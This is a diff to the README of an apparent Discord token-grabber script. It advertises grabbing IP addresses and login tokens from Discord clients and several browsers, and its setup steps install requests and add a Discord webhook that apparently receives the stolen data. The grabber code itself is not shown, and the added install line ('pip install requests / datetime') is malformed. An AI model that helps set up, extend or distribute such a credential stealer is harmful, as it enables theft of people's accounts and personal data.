@@ -1,5 +1,5 @@
-# DiscordTokenGrabber
-Grab tokens through this script
+# DiscordGrabbers
+Grab ip/tokens through this script
 Discord,Discord PTB,Discord Canary,Google Chrome,Opera,Brave,Yandex
 ---
 
@@ -14,7 +14,7 @@ Make sure to have installed `Python`
 cd (path to the file)
 ```
 ```sh
-pip install requests
+pip install requests / datetime
 ```
 ```sh
 Add discord webhook in 'WEBHOOK HERE'
